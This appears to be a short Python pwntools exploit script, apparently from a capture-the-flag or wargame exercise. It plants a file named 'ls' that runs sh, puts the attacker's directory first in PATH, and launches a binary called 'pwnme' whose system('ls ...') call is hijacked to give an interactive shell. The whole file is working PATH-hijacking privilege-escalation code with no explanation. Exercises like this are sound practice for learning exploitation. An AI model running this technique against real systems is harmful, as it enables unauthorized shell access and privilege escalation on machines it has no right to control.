```py
#!/usr/bin/python
from pwn import *
import os 

environment = {
"PATH":"/home/tux/0x05:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games",
}

open("ls", "w").write("sh")
os.chmod("ls", 0777)
# system("ls -l /home/tux");

p = process(['pwnme'], env=environment)
p.interactive()

```